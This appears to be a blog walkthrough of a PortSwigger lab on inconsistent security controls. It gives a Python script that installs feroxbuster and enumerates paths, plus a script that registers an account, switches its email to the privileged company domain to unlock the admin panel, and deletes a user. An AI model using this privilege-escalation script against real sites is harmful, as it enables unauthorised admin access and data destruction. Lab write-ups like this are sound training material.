--- 
title: "Inconsistent Security Controls"
author: ""
date: 2024-06-01T17:56:32+01:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
#### Entities
Asset: https://0a4400b5047397ff8067d59100b100bd.web-security-academy.net

#### Enumeration
Access the lab, add the domain to Burp's Target scope and check `Include subdomains`. View `/` route source page and inspect the page, then request all embedded links via Burp proxy using the scripts below.

```python
import os
import platform
import subprocess
import sys

def check_binary(binary_name):
  if sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
    command = ['which', binary_name]
  elif sys.platform.startswith('win'):
    command = ['where', binary_name]
  else:
    print("Unsupported operating system")
    return

  try:
    subprocess.check_output(command)
    return True
  except subprocess.CalledProcessError:
    print(f"{binary_name} is not installed.")
    return False

def install_binary(binary_url, binary_name):
  os_name = platform.system().lower()
  binary_file = f"{binary_name}.zip" if os_name == 'windows' else f"{binary_name}.tar.gz"
  
  # Check if binary exists
  if not check_binary(binary_name):
    # Download Binary File if not exist
    if not os.path.exists(binary_file):
      if os_name == 'linux':
        download_command = f"curl -L {binary_url}/x86_64-linux-{binary_name}.tar.gz -o {binary_file}"
      elif os_name == 'darwin':
        download_command = f"curl -L {binary_url}/x86_64-macos-{binary_name}.tar.gz -o {binary_file}"
      elif sys.platform.startswith('win'):
        download_command = f"powershell -Command 'Invoke-WebRequest {binary_url}/x86_64-windows-{binary_name}.exe.zip -OutFile {binary_file}'"
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(download_command, shell=True, check=True)
        print(f"{binary_name} downloaded successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to download {binary_name}: {e}")

    # Install Binary
    if os.path.exists(binary_file):
      if os_name in ['linux', 'darwin']:
        extract_command = f"sudo tar -C /usr/local/bin/ -xzf {binary_file} {binary_name} && sudo chmod 775 /usr/local/bin/{binary_name}"
      elif sys.platform.startswith('win'):
        extract_command = f"Powershell -Command \"Expand-Archive -Path {binary_file} -DestinationPath . ; Move-Item -Path .\\{binary_name}.exe -Destination 'C:\\Windows\\'\""
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(extract_command, shell=True, check=True)
        print(f"{binary_name} installed successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to install {binary_name}: {e}")

      # Clean up downloaded binary file
      try:
        cleanup_command = f"rm {binary_file}" if os_name != 'windows' else f"del {binary_file}"
        subprocess.run(cleanup_command, shell=True, check=True)
        print(f"Cleaned up {binary_file}")
      except subprocess.CalledProcessError as e:
        print(f"Failed to clean up {binary_file}: {e}")
  else:
    print(f"{binary_name} is already installed.")

def enumerate_path(endpoint, wordlist_path):
  print("Enumerating paths...")
  fuzz_command = f"feroxbuster -u {endpoint} -w {wordlist_path} -C 404 --proxy http://127.0.0.1:8080 --insecure --quiet --no-state --auto-tune"
  process = subprocess.Popen(fuzz_command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
  for line in process.stdout:
    print(line.strip())

def main():
  binary_name = "feroxbuster"
  binary_url = "https://github.com/epi052/feroxbuster/releases/download/v2.10.2"
  endpoint = "https://0a4400b5047397ff8067d59100b100bd.web-security-academy.net/"
  wordlist_path = "wordlist.txt"
  install_binary(binary_url, binary_name)
  enumerate_path(endpoint, wordlist_path)

if __name__ == "__main__":
  main()
```
The custom word list used for the above enumeration.
```text
accounts
admin
administrator
api
users
products
product
```

![Enumeration](/images/bizlogic3/01-enumerate-inconsistent-security-controls.png "Enumeration")  

#### Exploration
Stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on, explore the application by registering an account and logging into the application. Notice an email update feature.

![Exploration](/images/bizlogic3/02-explore-inconsistent-security-controls.png "Exploration") 

#### Exploitation
Now change your user to `@dontwannacry.com` email host and observe the 'Admin Panel' tab active. Click on it then delete the Carlos user. This exploit can be automated with the script below
```python
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SiteInteraction:
  def __init__(self, base_url, proxies=None):
    self.base_url = base_url
    self.session = requests.Session()
    self.session.proxies = proxies if proxies else {}

  def get_csrf_token(self, url):
    response = self.session.get(url, verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token
  
  def get_email_url(self):
    response = self.session.get(self.base_url, verify=False)
    email_client_url = BeautifulSoup(response.content, 'html.parser').find('a', {'id': 'exploit-link'}).get('href')
    return email_client_url

  def register(self, username, password):
    register_url = self.base_url + '/register'
    csrf_token = self.get_csrf_token(register_url)
    emailhost = urlparse(self.get_email_url()).hostname
    data = {
      'username': username,
      'email': username + '@' + emailhost,
      'password': password,
      'csrf': csrf_token
    }
    response = self.session.post(register_url, data=data, verify=False)
    return response

  def email_activation(self):
    response = self.session.get(self.get_email_url(), verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    activation_link = soup.find('a', href=True, string=lambda text: text and "temp-registration-token" in text)['href']
    activation_response = self.session.get(activation_link, verify=False)
    return activation_response

  def login(self, username, password):
    login_url = self.base_url + '/login'
    csrf_token = self.get_csrf_token(login_url)
    data = {
      'username': username,
      'password': password,
      'csrf': csrf_token
    }
    response = self.session.post(login_url, data=data, verify=False)
    return response

  def update_email(self, new_email):
    user_url = self.base_url + f'/my-account?id={username}'
    change_email_url = self.base_url + '/my-account/change-email'
    csrf_token = self.get_csrf_token(user_url)
    data = {
      'email': new_email,
      'csrf': csrf_token
    }
    response = self.session.post(change_email_url, data=data, verify=False)
    return response

  def delete_user(self, username):
    admin_delete_url = self.base_url + f'/admin/delete?username={username}'
    response = self.session.get(admin_delete_url, verify=False)
    return response

# Example usage:
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = 'https://0a4400b5047397ff8067d59100b100bd.web-security-academy.net'
site = SiteInteraction(url, proxies=proxies)
username = 'bug-hunter'
password = 'P@7sW0)d'
new_email = username + '@dontwannacry.com'

# Register a user
registration_response = site.register(username, password)
print("Registration response:", registration_response.status_code)

# Activate email
email_activation_response = site.email_activation()
print("Email activation response:", email_activation_response.status_code)

# Login
login_response = site.login(username, password)
print("Login response:", login_response.status_code)

# Update email
update_email_response = site.update_email(new_email)
print("Update email response:", update_email_response.status_code)

# Delete user
delete_user_response = site.delete_user('carlos')
print("Delete user response:", delete_user_response.status_code)
```
![Exploitation](/images/bizlogic3/03-exploit-inconsistent-security-controls.png "Exploitation") 

![Solution](/images/bizlogic3/04-lab-solution.png "Solution")   

#### Resources
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
- https://github.com/knoxknot/portswigger/tree/main/business-logic/03-inconsistent-security-controls